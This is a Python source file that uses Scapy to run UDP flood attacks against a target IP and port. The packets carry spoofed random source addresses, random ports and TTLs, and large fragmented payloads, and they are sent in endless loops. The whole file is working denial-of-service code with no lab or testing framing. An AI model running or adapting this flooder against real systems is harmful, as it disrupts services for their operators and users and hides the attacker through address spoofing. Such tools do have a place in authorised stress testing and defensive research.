from scapy.all import IP, UDP, send, RandIP, RandShort, fragment
from sys import path
path.append("..")
import packet_builder

def build_udp_packet(destination_ip, destination_port):
    """Generate UDP packet with random source port.

    Arguments: 
    destination_ip -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent

    """
    return IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()

def build_fragemneted_udp_packet(destination_ip, destination_port):
    """Generate fragmented UDP packet with random source port.

    Arguments: 
    destination_ip -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent

    """
    return fragment(IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())

def start_udp_flood(destination_ip, destination_port):
    """Continuously send UDP packets"""
    try:
        while True:
            send(build_udp_packet(destination_ip, destination_port), inter=packet_builder.generate_delay())   
    except KeyboardInterrupt:
        print("...Exiting...")

def start_fragmented_udp_flood(destination_ip, destination_port):
    """Continuously send fragmented UDP packets"""
    try:
        while True:
            for frag in build_fragemneted_udp_packet(destination_ip, destination_port):
                send(frag, inter=packet_builder.generate_delay())
    except KeyboardInterrupt:
        print("...Exiting...")